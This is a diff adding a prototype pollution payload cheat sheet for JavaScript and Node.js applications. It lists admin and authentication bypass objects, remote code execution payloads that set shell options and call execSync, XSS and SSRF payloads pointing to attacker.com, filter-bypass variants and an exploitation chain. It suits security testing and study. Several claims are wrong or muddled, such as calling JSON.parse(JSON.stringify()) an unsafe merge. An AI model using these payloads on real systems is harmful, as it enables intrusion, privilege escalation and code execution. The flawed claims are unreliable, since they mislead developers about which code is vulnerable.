@@ -1,0 +1,436 @@
+# Prototype Pollution Payloads
+
+## ========================================
+## BASIC PROTOTYPE POLLUTION
+## ========================================
+
+# JSON payload
+{
+  "__proto__": {
+    "polluted": "true"
+  }
+}
+
+# URL encoded
+__proto__[polluted]=true
+
+# Nested pollution
+{
+  "__proto__": {
+    "admin": true,
+    "role": "administrator"
+  }
+}
+
+## ========================================
+## CONSTRUCTOR POLLUTION
+## ========================================
+
+# Via constructor
+{
+  "constructor": {
+    "prototype": {
+      "polluted": true
+    }
+  }
+}
+
+# URL encoded constructor
+constructor[prototype][polluted]=true
+
+## ========================================
+## ARRAY POLLUTION
+## ========================================
+
+# Array notation
+{"__proto__": ["polluted"]}
+
+# Index-based
+__proto__[0]=value
+
+## ========================================
+## PROPERTY INJECTION
+## ========================================
+
+# Inject isAdmin
+{
+  "__proto__": {
+    "isAdmin": true
+  }
+}
+
+# Inject role
+{
+  "__proto__": {
+    "role": "admin"
+  }
+}
+
+## ========================================
+## DOS VIA POLLUTION
+## ========================================
+
+# Stack overflow
+{
+  "__proto__": {
+    "toString": "polluted"
+  }
+}
+
+# Memory exhaustion
+{
+  "__proto__": {
+    "x": new Array(1000000)
+  }
+}
+
+## ========================================
+## RCE VIA POLLUTION
+## ========================================
+
+# Inject shell command
+{
+  "__proto__": {
+    "shell": "calc",
+    "argv0": "calc"
+  }
+}
+
+# Node.js child_process
+{
+  "__proto__": {
+    "execPath": "/bin/bash",
+    "argv0": "bash -c 'whoami'"
+  }
+}
+
+## ========================================
+## XSS VIA POLLUTION
+## ========================================
+
+# Inject script source
+{
+  "__proto__": {
+    "src": "http://attacker.com/evil.js"
+  }
+}
+
+# Inject innerHTML
+{
+  "__proto__": {
+    "innerHTML": "<img src=x onerror=alert(1)>"
+  }
+}
+
+## ========================================
+## AUTHENTICATION BYPASS
+## ========================================
+
+# Bypass admin check
+{
+  "__proto__": {
+    "isAdmin": true,
+    "role": "admin"
+  }
+}
+
+# Bypass authentication
+{
+  "__proto__": {
+    "authenticated": true
+  }
+}
+
+## ========================================
+## QUERY PARAMETER POLLUTION
+## ========================================
+
+# GET parameters
+?__proto__[polluted]=true
+?__proto__[isAdmin]=true
+
+# Nested parameters
+?user[__proto__][admin]=true
+
+## ========================================
+## JSON POLLUTION
+## ========================================
+
+# Deep merge pollution
+{
+  "user": {
+    "__proto__": {
+      "role": "admin"
+    }
+  }
+}
+
+# Lodash merge
+_.merge({}, JSON.parse(user_input))
+
+## ========================================
+## FRAMEWORK-SPECIFIC
+## ========================================
+
+# Express.js
+?__proto__[middleware]=malicious
+
+# jQuery
+$.extend(true, {}, user_input)
+
+# Lodash
+_.merge({}, user_input)
+_.defaultsDeep({}, user_input)
+
+# Hoek
+Hoek.merge({}, user_input)
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Admin bypass
+POST /api/user
+{
+  "username": "attacker",
+  "email": "attacker@evil.com",
+  "__proto__": {
+    "isAdmin": true
+  }
+}
+
+# Example 2: RCE in Node.js
+{
+  "__proto__": {
+    "env": {
+      "NODE_OPTIONS": "--require /tmp/malicious.js"
+    }
+  }
+}
+
+## ========================================
+## PATH TRAVERSAL POLLUTION
+## ========================================
+
+# Via __proto__
+{
+  "__proto__": {
+    "basePath": "../../../../etc"
+  }
+}
+
+## ========================================
+## BYPASS SANITIZATION
+## ========================================
+
+# Alternative syntax
+constructor.prototype.polluted=true
+
+# Unicode escape
+\u005f\u005fproto\u005f\u005f
+
+# Computed property
+{
+  ["__proto__"]: {"polluted": true}
+}
+
+## ========================================
+## CLIENT-SIDE POLLUTION
+## ========================================
+
+# Browser environment
+<script>
+  location.hash = "#__proto__[polluted]=true";
+</script>
+
+# Pollute via URL
+http://target.com/#__proto__[isAdmin]=true
+
+## ========================================
+## SERVER-SIDE POLLUTION
+## ========================================
+
+# Node.js pollution
+POST /api/config
+{
+  "__proto__": {
+    "NODE_ENV": "production",
+    "DEBUG": "*"
+  }
+}
+
+## ========================================
+## AST POLLUTION
+## ========================================
+
+# Template injection
+{
+  "__proto__": {
+    "type": "Identifier",
+    "name": "process.mainModule.require('child_process').execSync('whoami')"
+  }
+}
+
+## ========================================
+## PROPERTY OVERRIDE
+## ========================================
+
+# Override existing properties
+{
+  "__proto__": {
+    "toString": function() { return "polluted"; }
+  }
+}
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify merge/extend operations
+grep -r "merge\|extend\|clone" app.js
+
+# 2. Test with basic payload
+{"__proto__": {"test": "polluted"}}
+
+# 3. Check if pollution worked
+Check if Object.prototype.test exists
+
+# 4. Exploit
+Inject malicious properties
+
+## ========================================
+## DETECTION PAYLOADS
+## ========================================
+
+# Test payload
+{
+  "__proto__": {
+    "polluted": "yes"
+  }
+}
+
+# Verification
+console.log(({}).polluted);  // Should be "yes"
+
+## ========================================
+## COMMON VULNERABLE PATTERNS
+## ========================================
+
+# Pattern 1: Unsafe merge
+Object.assign({}, user_input)
+
+# Pattern 2: Deep copy
+JSON.parse(JSON.stringify(obj))
+
+# Pattern 3: Recursive assign
+function merge(target, source) {
+  for (let key in source) {
+    target[key] = source[key];  // Vulnerable
+  }
+}
+
+## ========================================
+## PRIVILEGE ESCALATION
+## ========================================
+
+# Escalate to admin
+{
+  "__proto__": {
+    "role": "admin",
+    "permissions": ["all"]
+  }
+}
+
+## ========================================
+## BYPASS DEFENSES
+## ========================================
+
+# If __proto__ is blocked
+{
+  "constructor": {
+    "prototype": {
+      "polluted": true
+    }
+  }
+}
+
+# If both blocked, use:
+Object.prototype
+
+## ========================================
+## REAL-WORLD PAYLOADS
+## ========================================
+
+# CVE-2019-11358 (jQuery)
+$.extend(true, {}, {"__proto__": {"polluted": true}})
+
+# CVE-2019-10744 (Lodash)
+_.defaultsDeep({}, {"__proto__": {"polluted": true}})
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing
+Burp Suite Repeater
+
+# Automated scanning
+- Server-side Prototype Pollution Scanner (Burp extension)
+- PPScan
+
+# Node.js testing
+npm audit
+
+## ========================================
+## EXPLOITATION CHAIN
+## ========================================
+
+# Step 1: Find pollution point
+POST /api/settings
+{"theme": "dark", "__proto__": {"test": "polluted"}}
+
+# Step 2: Verify pollution
+Check if new objects have property
+
+# Step 3: Find gadget
+Property that leads to RCE/XSS
+
+# Step 4: Exploit
+Pollute with malicious value
+
+## ========================================
+## COMMON GADGETS
+## ========================================
+
+# Transport (Mongoose)
+{
+  "__proto__": {
+    "transport": "smtp",
+    "host": "attacker.com"
+  }
+}
+
+# Templates
+{
+  "__proto__": {
+    "template": "<script>alert(1)</script>"
+  }
+}
+
+## ========================================
+## CHAINING ATTACKS
+## ========================================
+
+# Pollution + SSRF
+{
+  "__proto__": {
+    "proxy": "http://attacker.com"
+  }
+}
+
+# Pollution + SQL Injection
+{
+  "__proto__": {
+    "where": "1=1"
+  }
+}
